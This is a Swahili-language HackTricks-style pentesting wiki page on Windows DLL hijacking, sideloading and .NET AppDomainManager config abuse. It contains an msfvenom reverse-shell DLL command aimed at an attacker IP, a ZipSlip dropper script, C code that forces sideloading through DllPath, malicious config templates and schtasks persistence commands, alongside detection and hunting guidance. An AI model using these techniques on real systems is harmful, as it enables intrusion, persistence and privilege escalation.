# DLL Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Taarifa za Msingi

DLL Hijacking huhusisha kudanganya programu inayoaminika ili ipakie DLL hasidi. Neno hili linajumuisha mbinu kadhaa kama **DLL Spoofing, Injection, na Side-Loading**. Hutumika hasa kutekeleza code na kupata persistence, na mara chache zaidi, kuongeza privilege. Ingawa hapa tunalenga kuongeza privilege, mbinu ya hijacking hubaki ileile bila kujali lengo.

### Mbinu za Kawaida

Mbinu kadhaa hutumiwa kwa DLL hijacking, na ufanisi wa kila moja hutegemea jinsi programu inavyopakia DLL:<sup>[[4]](#references)</sup>

1. **DLL Replacement**: Kubadilisha DLL halisi na DLL hasidi, na ikiwezekana kutumia DLL Proxying ili kuhifadhi utendaji wa DLL asilia.
2. **DLL Search Order Hijacking**: Kuweka DLL hasidi katika njia ya utafutaji iliyo mbele ya ile halali, na kutumia mpangilio wa utafutaji wa programu.
3. **Phantom DLL Hijacking**: Kuunda DLL hasidi ambayo programu itapakia kwa kudhani kuwa ni DLL inayohitajika lakini haipo.
4. **DLL Redirection**: Kubadilisha vigezo vya utafutaji kama `%PATH%` au faili za `.exe.manifest` / `.exe.local` ili kuelekeza programu kwenye DLL hasidi.
5. **WinSxS DLL Replacement**: Kubadilisha DLL halali na inayofanana nayo hasidi katika saraka ya WinSxS; mbinu hii mara nyingi huhusishwa na DLL side-loading.
6. **Relative Path DLL Hijacking**: Kuweka DLL hasidi katika saraka inayodhibitiwa na mtumiaji pamoja na programu iliyonakiliwa, kwa kufanana na mbinu za Binary Proxy Execution.

Programu inaweza pia kutekeleza **DLL loader yake yenyewe**. Process yenye privilege ya juu inaweza kuorodhesha saraka ndogo kama `Libraries` au `Plugins` na kupitisha DLL iliyochaguliwa kwa helper, bila kutegemea mpangilio wa kawaida wa utafutaji wa DLL wa Windows. Ikiwa akaunti nyingine inaweza kuunda faili katika saraka hiyo mahususi, lichukulie hilo kama kidokezo cha uchunguzi: thibitisha utambulisho wa process, ACL inayotumika kwa saraka, kanuni ya kuchagua faili, na uwezekano wa kufikia operesheni ya kupakia DLL. Saraka inayoweza kuandikiwa iliyo karibu na executable haithibitishi kuwa process hupakia DLL kutoka humo.

{{#ref}}
windows-cpython-build-landmark-sys-path-hijacking.md
{{#endref}}

### Post-installation PE import grafting

Side-loading ya kawaida huacha PE inayoaminika bila mabadiliko na kufanikiwa katika utatuzi wa majina ya DLL. **Import grafting** badala yake hurekebisha PE ambayo tayari imepakiwa na programu inayoaminika. Mshambuliaji huongeza import descriptor na maingizo yanayohusiana ya lookup/IAT kwa DLL inayodhibitiwa na mshambuliaji. Windows inapotafuta utegemezi huo kwa kurudia, hupakia DLL iliyoongezwa na kuendesha msimbo wake wa uanzishaji ndani ya process halali kwa vinginevyo. Huu ni urekebishaji wa PE kwenye diski, si operesheni sawa na kubadilisha pointer ya kazi ya IAT iliyo hai kwa runtime hook.<sup>[[26]](#references)[[27]](#references)</sup>

PE iliyorekebishwa inaweza kuwa vendor DLL ya kati badala ya executable iliyoanzishwa na mtumiaji au Task Scheduler. Mlolongo unaoweza kutumiwa tena ni:<sup>[[27]](#references)</sup>

1. Nakili executable halali na dependencies zake hadi kwenye saraka inayodhibitiwa na mshambuliaji.
2. Rekebisha miundo ya import ya dependency moja ili irejelee DLL hasidi, huku ukihifadhi exports zinazotarajiwa na tabia ya kawaida ya dependency hiyo.
3. Sanidi autorun au scheduled task ili ianzishe executable halali. Loader itapakia dependency iliyobadilishwa kisha DLL iliyoingizwa hivi karibuni. Tazama [Privilege Escalation with Autoruns](../privilege-escalation-with-autorun-binaries.md#scheduled-tasks) kwa ajili ya kuorodhesha tasks.
4. Epuka kuweka kazi nzito ndani ya `DllMain`; loader iliyozingatiwa iliunda worker thread na kuendelea na decryption iliyopangwa humo.

Hii ni tofauti na kuathiriwa kwa supply chain upande wa vendor, ikiwa kifurushi cha vendor ni safi na import inarekebishwa baada ya usakinishaji. Chunguza kila module katika saraka iliyowekwa, si host EXE pekee: linganisha orodha za import za dependencies na hashes na usakinishaji unaojulikana kuwa salama, thibitisha signatures, na chunguza vendor binaries zinazoanzishwa kutoka maeneo yasiyo ya kawaida yanayoweza kuandikiwa kama `C:\ProgramData`. Scheduled task inayoelekeza kwenye crash reporter au updater iliyonakiliwa katika saraka kama hiyo ni sehemu muhimu hasa ya kuanzia uchunguzi.<sup>[[27]](#references)</sup>


### AppDomainManager hijacking (`<exe>.config` + attacker assembly)

Classic DLL sideloading si njia pekee ya kufanya process inayoaminika ya **.NET Framework** ipakie msimbo wa mshambuliaji. Ikiwa executable lengwa ni programu ya **managed**, CLR pia hukagua **application configuration file** iliyopewa jina la executable (kwa mfano `Setup.exe.config`). Faili hiyo inaweza kufafanua **AppDomainManager** maalum. Ikiwa config inaelekeza kwenye assembly inayodhibitiwa na mshambuliaji na iliyowekwa karibu na EXE, CLR huipakia **kabla ya njia ya kawaida ya msimbo wa programu** na kuiendesha ndani ya process inayoaminika.<sup>[[24]](#references)</sup>

Kulingana na schema ya usanidi wa .NET Framework ya Microsoft, `<appDomainManagerAssembly>` na `<appDomainManagerType>` zote lazima ziwepo ili manager maalum itumike.<sup>[[16]](#references)[[17]](#references)</sup>

Config ya chini kabisa:

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
    <appDomainManagerType value="EvilMgr.Loader" />
  </runtime>
</configuration>
```

Msimamizi wa kiwango cha chini:

```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
  [DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
  public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
    MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
  }
}
```

Vidokezo vya kiutendaji:
- Hii ni mbinu maalum ya **.NET Framework**. Inategemea uchanganuzi wa usanidi wa CLR, si mpangilio wa utafutaji wa Win32 DLL.
- Host lazima iwe **managed EXE** halisi. Ukaguzi wa haraka: `sigcheck -m target.exe`, `corflags target.exe`, au angalia **CLR Runtime Header** kwenye metadata ya PE.
- Jina la faili ya usanidi lazima lilingane kabisa na jina la executable (`<binary>.config`) na kwa kawaida faili hiyo huwa **pamoja na EXE**.
- Hii ni muhimu kwa kutumia **binaries za Microsoft/vendor zilizosainiwa**, kwa sababu EXE inayoaminika hubaki bila kuguswa huku managed assembly hasidi ikitekelezwa ndani ya mchakato.
- Ikiwa tayari una saraka ya installer/update inayoweza kuandikiwa, AppDomainManager hijacking inaweza kutumika kama **hatua ya kwanza**, ikifuatiwa na DLL sideloading ya kawaida au reflective loading kwa hatua zinazofuata.

### AppDomainManager kama downloader + bootstrap ya scheduled-task

Muundo wa vitendo wa uvamizi ni kuoanisha EXE ya managed inayoaminika na `*.config` hasidi pamoja na AppDomainManager DLL hasidi inayofanya kazi kama **bootstrapper ndogo** pekee:<sup>[[25]](#references)</sup>

1. Mtumiaji huzindua installer au updater ya .NET iliyosainiwa kutoka eneo linaloaminika, kama `%USERPROFILE%\Downloads`.
2. Config iliyo karibu husababisha CLR kupakia assembly ya mshambuliaji **kabla** mantiki halali ya programu kuanza.
3. Manager hasidi hufanya **ukaguzi wa path** (kwa mfano, kuendelea tu ikiwa host EXE inaendeshwa kutoka `Downloads`, na kuruhusu hatua ya pili iendeshwe tu kutoka `%LOCALAPPDATA%`).
4. Ukaguzi ukifaulu, hupakua payload halisi kwenye path inayoweza kuandikiwa na mtumiaji, kama `%LOCALAPPDATA%\PerfWatson2.exe`, na kuweka persistence kwa kutumia scheduled task.

Kwa nini toleo hili ni muhimu:
- Host EXE iliyosainiwa hubaki bila kubadilishwa, kwa hiyo triage inayokagua hash ya binary kuu pekee inaweza kukosa udukuzi.
- **Path-based anti-analysis** rahisi ni ya kawaida: kuhamisha seti ya ZIP/EXE/DLL hadi Desktop, Temp, au path ya sandbox kunaweza kuvunja mnyororo kimakusudi.
- AppDomainManager DLL ya hatua ya kwanza inaweza kubaki ndogo na isiyo na kelele nyingi huku implant halisi ikipakuliwa baadaye.

Mfano mdogo wa persistence unaoonekana mara nyingi katika muundo huu:

```cmd
schtasks /create /tn "GoogleUpdaterTaskSystem140.0.7272.0" /sc onlogon /tr "%LOCALAPPDATA%\PerfWatson2.exe" /rl highest /f
```

Vidokezo:
- ` /rl highest` humaanisha **kiwango cha juu zaidi kinachopatikana** kwa mtumiaji/kikao hicho; peke yake hakihakikishi kupandishwa hadi SYSTEM.
- Mbinu hii mara nyingi huainishwa vyema zaidi kama **utekelezaji/udumishaji kupitia matumizi mabaya ya usanidi wa .NET** kuliko utekaji wa kawaida wa mpangilio wa utafutaji wa DLL isiyokuwepo, ingawa waendeshaji mara nyingi huunganisha mbinu zote mbili.

Viashiria vya ugunduzi:
- Programu za .NET zilizosainiwa zinazozinduliwa kutoka **njia za uchimbuaji wa ZIP**, `Downloads`, `%TEMP%`, au folda nyingine zinazoweza kuandikwa na mtumiaji, zikiwa na faili ya `<exe>.config` **kwenye folda hiyo hiyo**.
- Kazi mpya zilizopangwa ambazo kitendo chake kinaelekeza kwenye `%LOCALAPPDATA%`, `%APPDATA%`, au `Downloads`, na ambazo majina yake yanafanana na visasishaji vya browser/vendor.
- Michakato ya muda mfupi ya bootstrap inayotumia managed code, ambayo hupakua EXE nyingine mara moja kisha huzindua `schtasks.exe`.
- Sampuli zinazoacha kufanya kazi mapema isipokuwa njia ya executable ilingane na folda ya wasifu wa mtumiaji inayotarajiwa.

### Kuteka kazi iliyopo iliyopangwa ili kuzindua upya mnyororo wa sideload

Kwa ajili ya udumishaji, usitafute tu **kuunda kazi mpya**. Baadhi ya makundi ya wavamizi husubiri hadi kisakinishi halali kiunde **kazi ya kawaida ya kusasisha**, kisha **hubadilisha kitendo cha kazi hiyo** ili jina, mwandishi na kichochezi kilichopo viendelee kuonekana kuwa vya kawaida kwa watetezi.

Mtiririko wa kazi unaoweza kutumiwa tena:
1. Sakinisha/endesha programu halali na utambue kazi ambayo kwa kawaida huunda.
2. Hamisha XML ya kazi na uandike thamani za sasa za `<Exec><Command>` / `<Arguments>`.<sup>[[23]](#references)</sup>
3. Badilisha kitendo pekee ili kazi ianzishe **EXE mwenyeji unayemwamini** kutoka kwenye saraka ya maandalizi inayoweza kuandikwa na mtumiaji; EXE hiyo itapakia payload halisi kwa sideload au AppDomain.
4. Sajili tena jina lilelile la kazi badala ya kuunda kifaa kipya cha wazi cha udumishaji.

```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```

Kwa nini ni fiche zaidi:
- Jina la task bado linaweza kuonekana halali (kwa mfano, updater ya vendor).
- **Huduma ya Task Scheduler** ndiyo inayoiendesha, kwa hiyo ukaguzi wa parent/ancestor mara nyingi huona mnyororo wa scheduling unaotarajiwa badala ya `explorer.exe`.
- Timu za DFIR zinazotafuta tu **majina mapya ya task** zinaweza kukosa task ambayo usajili wake tayari ulikuwepo, lakini action yake sasa inaelekeza kwenye `%LOCALAPPDATA%`, `%APPDATA%`, au njia nyingine inayodhibitiwa na mshambuliaji.

Njia za haraka za kutafuta:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- Linganisha XML za `C:\Windows\System32\Tasks\*` na metadata ya `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` na baseline.
- Weka alert task ya updater inayoonekana kuwa ya **vendor** inapotekelezwa kutoka **directories ambazo mtumiaji anaweza kuandika** au inapozindua .NET EXE yenye faili ya `*.config` iliyo kwenye directory hiyo hiyo.

> [!TIP]
> Kwa mnyororo wa hatua kwa hatua unaoweka HTML staging, configs za AES-CTR, na .NET implants juu ya DLL sideloading, kagua workflow iliyo hapa chini.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Kutafuta DLL zinazokosekana

Njia ya kawaida zaidi ya kupata Dlls zinazokosekana ndani ya mfumo ni kuendesha [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) kutoka sysinternals, **ukiweka** **filters 2 zifuatazo**:

![Common Techniques - Kutafuta Dlls zinazokosekana: Njia ya kawaida zaidi ya kupata Dlls zinazokosekana ndani ya mfumo ni kuendesha procmon kutoka sysinternals, ukiweka filters 2 zifuatazo](<../../../images/image (961).png>)

![Common Techniques - Kutafuta Dlls zinazokosekana: Njia ya kawaida zaidi ya kupata Dlls zinazokosekana ndani ya mfumo ni kuendesha procmon kutoka sysinternals, ukiweka filters 2 zifuatazo](<../../../images/image (230).png>)

na uonyeshe tu **File System Activity**:

![Common Techniques - Kutafuta Dlls zinazokosekana: na uonyeshe tu File System Activity](<../../../images/image (153).png>)

Ikiwa unatafuta **dll zinazokosekana kwa ujumla**, **iache** ikiendelea kwa **sekunde** chache.\
Ikiwa unatafuta **DLL inayokosekana ndani ya executable maalum**, weka filter nyingine kama **"Process Name" "contains" `<exec name>`**, iendeshe, kisha usimamishe kunasa matukio.<sup>[[9]](#references)</sup>

## Kutumia DLL zinazokosekana

Ili kuongeza privileges, tafuta **DLL ambayo process yenye privileges hujaribu ku-load** kutoka eneo ambalo unaweza kuandikia. Hili linaweza kutokea unapodhibiti directory inayotafutwa kabla ya directory iliyo na DLL halali, au pale DLL iliyoombwa haipo na unaweza kuandika kwenye mojawapo ya directories zinazotafutwa.

### Mpangilio wa utafutaji wa Dll

**Ndani ya** [**nyaraka za Microsoft**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **unaweza kupata maelezo ya jinsi Dlls zinavyopakiwa.**

**Windows applications** hutafuta DLLs kwa kufuata seti ya **njia za utafutaji zilizoainishwa mapema**, kwa mfuatano maalum. Tatizo la DLL hijacking hutokea pale DLL hasidi inapowekwa kimkakati kwenye mojawapo ya directories hizi, ili ipakiwe kabla ya DLL halisi. Njia ya kuzuia hili ni kuhakikisha application inatumia absolute paths inaporejelea DLLs inazohitaji.

Unaweza kuona **mpangilio wa utafutaji wa DLL kwenye** mifumo ya **32-bit** hapa chini:

1. Directory ambayo application ilipakiwa kutoka.
2. System directory. Tumia function ya [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) kupata path ya directory hii.(_C:\Windows\System32_)
3. Directory ya mfumo ya 16-bit. Hakuna function inayopata path ya directory hii, lakini inatafutwa. (_C:\Windows\System_)
4. Windows directory. Tumia function ya [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) kupata path ya directory hii.
   1. (_C:\Windows_)
5. Directory ya sasa.
6. Directories zilizoorodheshwa kwenye environment variable ya PATH. Kumbuka kwamba hii haijumuishi path ya per-application iliyobainishwa na registry key ya **App Paths**. Key ya **App Paths** haitumiki wakati wa kukokotoa path ya utafutaji wa DLL.

Huu ndio mpangilio wa utafutaji wa **chaguomsingi** wakati **SafeDllSearchMode** imewashwa. Ikiwa imezimwa, directory ya sasa hupanda hadi nafasi ya pili. Ili kuzima kipengele hiki, tengeneza registry value ya **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** na uiweke kuwa 0 (imewashwa kwa chaguomsingi).

Ikiwa function ya [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) itaitwa na **LOAD_WITH_ALTERED_SEARCH_PATH**, utafutaji huanza kwenye directory ya executable module ambayo **LoadLibraryEx** inai-load.

Hatimaye, DLL inaweza kupakiwa kwa absolute path badala ya jina lake. Katika hali hiyo, Windows hutafuta DLL yenyewe kwenye path hiyo pekee; dependencies zinazoombwa kwa jina bado hufuata mpangilio unaotumika wa utafutaji.

Kuna njia nyingine za kubadilisha mpangilio wa utafutaji, lakini sitazieleza hapa.

### Kuunganisha arbitrary file write na missing-DLL hijack

**Mbinu inayohusiana:** [oplock-gated mount-point switching against privileged remediation](../kernel-race-condition-object-manager-slowdown.md#applied-chain-oplock-gated-mount-point-switch-against-privileged-remediation).

1. Tumia filters za **ProcMon** (`Process Name` = target EXE, `Path` ends with `.dll`, `Result` = `NAME NOT FOUND`) kukusanya majina ya DLL ambazo process inajaribu kupata lakini haiwezi.<sup>[[14]](#references)</sup>
2. Ikiwa binary inaendeshwa kwa **ratiba/kama service**, kuweka DLL yenye mojawapo ya majina hayo kwenye **application directory** (nafasi ya #1 kwenye mpangilio wa utafutaji) kutaiwezesha kupakiwa wakati wa utekelezaji unaofuata. Katika kisa kimoja cha .NET scanner, process ilitafuta `hostfxr.dll` kwenye `C:\samples\app\` kabla ya kupakia nakala halisi kutoka `C:\Program Files\dotnet\fxr\...`.
3. Tengeneza payload DLL (kwa mfano, reverse shell) yenye export yoyote: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. Ikiwa primitive yako ni **arbitrary write ya aina ya ZipSlip**, tengeneza ZIP ambayo entry yake inatoka nje ya extraction dir ili DLL iishie kwenye app folder:

```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
    z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```

5. Peleka archive kwenye inbox/share inayofuatiliwa; task iliyopangwa itakapozindua tena process, process hiyo itapakia DLL hasidi na kutekeleza code yako kama akaunti ya huduma.

### Kulazimisha sideloading kupitia RTL_USER_PROCESS_PARAMETERS.DllPath

Njia ya kina ya kudhibiti kwa uhakika DLL search path ya process mpya ni kuweka field ya DllPath katika RTL_USER_PROCESS_PARAMETERS wakati wa kuunda process kwa kutumia native APIs za ntdll. Kwa kutoa directory inayodhibitiwa na mshambuliaji hapa, process lengwa inayotafuta DLL iliyoingizwa kwa jina (bila absolute path na bila kutumia safe loading flags) inaweza kulazimishwa kupakia DLL hasidi kutoka kwenye directory hiyo.

Wazo kuu
- Unda process parameters kwa kutumia RtlCreateProcessParametersEx na utoe DllPath maalum inayoelekeza kwenye folder unayodhibiti (kwa mfano, directory ilipo dropper/unpacker yako).
- Unda process kwa kutumia RtlCreateUserProcess. Binary lengwa inapotafuta DLL kwa jina, loader itatumia DllPath hii iliyotolewa wakati wa utafutaji, hivyo kuwezesha sideloading ya kuaminika hata kama DLL hasidi haiko pamoja na target EXE.

Vidokezo/vikwazo
- Hili linaathiri child process inayoundwa; ni tofauti na SetDllDirectory, ambayo huathiri process ya sasa pekee.
- Target lazima iweke DLL kwenye import au iite LoadLibrary kwa jina (bila absolute path na bila kutumia LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs na absolute paths zilizowekwa moja kwa moja haziwezi kutekwa. Forwarded exports na SxS zinaweza kubadilisha mpangilio wa kipaumbele.

Mfano mdogo wa C (ntdll, wide strings, ushughulikiaji wa hitilafu uliorahisishwa):

<details>
<summary>Mfano kamili wa C: kulazimisha DLL sideloading kupitia RTL_USER_PROCESS_PARAMETERS.DllPath</summary>

```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
    PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
    PUNICODE_STRING ImagePathName,
    PUNICODE_STRING DllPath,
    PUNICODE_STRING CurrentDirectory,
    PUNICODE_STRING CommandLine,
    PVOID Environment,
    PUNICODE_STRING WindowTitle,
    PUNICODE_STRING DesktopInfo,
    PUNICODE_STRING ShellInfo,
    PUNICODE_STRING RuntimeData,
    ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
    PUNICODE_STRING NtImagePathName,
    ULONG Attributes,
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
    PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
    PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
    HANDLE ParentProcess,
    BOOLEAN InheritHandles,
    HANDLE DebugPort,
    HANDLE ExceptionPort,
    PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
    DWORD n = GetModuleFileNameW(h, out, cch);
    for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
    // Target Microsoft-signed, DLL-hijackable binary (example)
    const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

    // Build custom DllPath = directory of our current module (e.g., the unpacked archive)
    wchar_t dllDir[MAX_PATH];
    DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

    UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
    RtlInitUnicodeString(&uImage, image);
    RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
    RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
    RtlInitUnicodeString(&uCurDir, dllDir);

    RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
        (RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
    RtlCreateUserProcess_t pRtlCreateUserProcess =
        (RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

    RTL_USER_PROCESS_PARAMETERS *pp = NULL;
    NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
                                                NULL, NULL, NULL, NULL, NULL, 0);
    if (st < 0) return 1;

    RTL_USER_PROCESS_INFORMATION pi = {0};
    st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
    if (st < 0) return 1;

    // Resume main thread etc. if created suspended (not shown here)
    return 0;
}
```

</details>

Mfano wa matumizi ya kiutendaji
- Weka xmllite.dll hasidi (inayosafirisha functions zinazohitajika au kuelekeza maombi kwa DLL halisi) kwenye saraka yako ya DllPath.
- Zindua binary iliyosainiwa inayojulikana kutafuta xmllite.dll kwa jina kwa kutumia mbinu iliyo hapo juu. Loader hutatua import kupitia DllPath iliyotolewa na kufanya sideload ya DLL yako.

Mbinu hii imeonekana kutumika katika mazingira halisi kuendesha minyororo ya sideloading ya hatua nyingi: launcher ya awali huacha helper DLL, ambayo kisha huzindua binary iliyosainiwa na Microsoft inayoweza kutekwa, ikiwa na DllPath maalum ili kulazimisha kupakia DLL ya mshambuliaji kutoka kwenye saraka ya staging.<sup>[[6]](#references)</sup>


### Utekaji wa .NET AppDomainManager kupitia `.exe.config`

Kwa malengo ya **.NET Framework**, sideloading inaweza kufanywa **kabla ya `Main()`** bila kurekebisha memory kwa kutumia vibaya faili ya karibu ya **`.exe.config`** ya programu. Badala ya kutegemea tu mpangilio wa utafutaji wa Win32 DLL, mshambuliaji huweka EXE halali ya .NET pamoja na config hasidi na assembly moja au zaidi zinazodhibitiwa na mshambuliaji.

Jinsi mnyororo huu unavyofanya kazi:<sup>[[15]](#references)[[22]](#references)</sup>
1. EXE mwenyeji huanza na **CLR husoma `<exe>.config`**.
2. Config huweka **`<appDomainManagerAssembly>`** na **`<appDomainManagerType>`** ili runtime iunde `AppDomainManager` inayodhibitiwa na mshambuliaji.
3. Manager hasidi hupata **utekelezaji kabla ya `Main()`** ndani ya mchakato wa mwenyeji unaoaminika.
4. Config hiyo hiyo inaweza kulazimisha CLR kutatua assembly za ndani kwanza (kwa mfano `InitInstall.dll`, `Updater.dll`, `uevmonitor.dll`) na inaweza kudhoofisha uthibitishaji/telemetry ya runtime bila inline patching.

Muundo wa aina ya kampeni (upangaji kamili unaweza kutofautiana kulingana na directive / toleo la CLR):

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="Updater" />
    <appDomainManagerType value="MyAppDomainManager" />
    <assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
      <probing privatePath="." />
      <publisherPolicy apply="no" />
    </assemblyBinding>
    <bypassTrustedAppStrongNames enabled="true" />
    <etwEnable enabled="false" />
  </runtime>
  <startup>
    <requiredRuntime version="v4.0.30319" safemode="true" />
  </startup>
</configuration>
```

Kwa nini hii ni muhimu:
- **`<probing privatePath="."/>`** huweka utatuzi wa assembly kwenye saraka ya programu, na kuifanya folda kuwa eneo linalotabirika la sideloading.<sup>[[18]](#references)</sup>
- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`** huhamishia utekelezaji kwenye code ya mshambuliaji wakati wa uanzishaji wa CLR, kabla mantiki halali ya programu haijaanza kutekelezwa.<sup>[[16]](#references)[[17]](#references)</sup>
- **`<bypassTrustedAppStrongNames enabled="true"/>`** inaweza kuruhusu app yenye full-trust kupakia assemblies zisizosainiwa au zilizobadilishwa bila hitilafu ya uthibitishaji wa strong-name.<sup>[[19]](#references)</sup>
- **`<publisherPolicy apply="no"/>`** huzuia uelekezaji upya wa publisher-policy kwenda kwenye assemblies mpya zaidi.<sup>[[20]](#references)</sup>
- **`<requiredRuntime ... safemode="true"/>`** hufanya uteuzi wa runtime uwe rahisi kutabirika.<sup>[[21]](#references)</sup>
- **`<etwEnable enabled="false"/>`** inavutia hasa kwa sababu **CLR huzima mwonekano wake wa ETW** kupitia usanidi, badala ya implant kurekebisha `EtwEventWrite` kwenye kumbukumbu.

Muundo wa kiutendaji ulioonekana kwenye kampeni za hivi karibuni:
- Hatua ya 1 huweka `setup.exe`, `setup.exe.config`, na assemblies za ndani.
- Hatua ya 2 huzinakili kwenye folda ya **AppData update** inayoonekana kuaminika, hubadilisha jina la host kuwa kitu kama `update.exe`, kisha huiwasha tena kupitia **scheduled task**.
- Hatua ya 3 huthibitisha muktadha wa utekelezaji (kwa mfano, parent inayotarajiwa ya `svchost.exe` kutoka Task Scheduler) kabla ya kupakia RAT DLL/export ya mwisho.

Mawazo ya kutafuta:
- **.NET executables** zilizosainiwa au halali kwa njia nyingine zinazoendeshwa zikiwa na faili za **`.config`** za kutiliwa shaka karibu nazo, kwenye maeneo ambayo watumiaji wanaweza kuandika.
- Faili za `.config` zilizo na **`appDomainManagerAssembly`**, **`appDomainManagerType`**, **`probing privatePath="."`**, **`bypassTrustedAppStrongNames`**, au **`etwEnable enabled="false"`**.
- Scheduled tasks zinazoanzisha upya binaries za update zilizopewa majina mapya kutoka **`%LOCALAPPDATA%`** au saraka maalum za programu za `\bin\update\`.
- Minyororo ya parent/child ambapo scheduled task huanzisha .NET host inayoaminika, ambayo mara moja hupakia assemblies zisizotoka kwa vendor kutoka kwenye saraka yake yenyewe.

#### Vighairi vya mpangilio wa utafutaji wa DLL kwenye nyaraka za Windows

Vighairi fulani vya mpangilio wa kawaida wa utafutaji wa DLL vimetajwa kwenye nyaraka za Windows:

- DLL yenye **jina sawa na DLL ambayo tayari imepakiwa kwenye kumbukumbu** inapokutwa, mfumo huruka utafutaji wa kawaida. Badala yake, hukagua uelekezaji upya na manifest kabla ya kutumia DLL ambayo tayari iko kwenye kumbukumbu. **Katika hali hii, mfumo hautafuti DLL hiyo**.
- DLL inapotambuliwa kama **known DLL** kwa toleo la sasa la Windows, mfumo hutumia toleo lake la known DLL hiyo, pamoja na DLL zozote inazotegemea, **bila kufanya utafutaji**. Ufunguo wa registry **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** una orodha ya known DLL hizi.
- DLL ikiwa na **dependencies**, utafutaji wa DLL hizo tegemezi hufanywa kana kwamba zimetajwa kwa kutumia **majina ya module** pekee, bila kujali kama DLL ya awali ilitambuliwa kupitia full path.

### Kuongeza Marupurupu

**Mahitaji**:

- Tambua mchakato unaoendeshwa au utakaoendeshwa chini ya **marupurupu tofauti** (horizontal or lateral movement), na **usiokuwa na DLL**.
- Hakikisha kuna **ruhusa ya kuandika** kwenye **saraka** yoyote ambamo **DLL** itatafutwa. Eneo hili linaweza kuwa saraka ya executable au saraka iliyo ndani ya system path.

Masharti haya kwa kawaida si ya kawaida: executables zenye marupurupu kwa kawaida hazikosi dependencies za DLL, na watumiaji wa kawaida kwa kawaida hawawezi kuandika kwenye saraka za system search-path. Hata hivyo, mazingira yaliyosanidiwa vibaya bado yanaweza kufichua masharti yote mawili.\
Masharti yakitimia, angalia mradi wa [UACME](https://github.com/hfiref0x/UACME). Ingawa lengo lake kuu ni UAC bypass, una PoCs za DLL-hijacking za matoleo maalum ya Windows ambazo mara nyingi zinaweza kurekebishwa ili kutumia saraka inayoweza kuandikika uliyoipata.

Kumbuka kuwa unaweza **kukagua ruhusa zako kwenye folda** kwa kutumia:<sup>[[5]](#references)</sup>

```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```

Na **kagua ruhusa za folda zote ndani ya PATH**:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Unaweza pia kukagua imports za executable na exports za dll kwa kutumia:

```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```

Kwa mwongozo kamili kuhusu jinsi ya **kutumia vibaya DLL Hijacking ili kupandisha ruhusa** ukiwa na ruhusa za kuandika kwenye **folda ya System Path**, angalia:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Zana za kiotomatiki

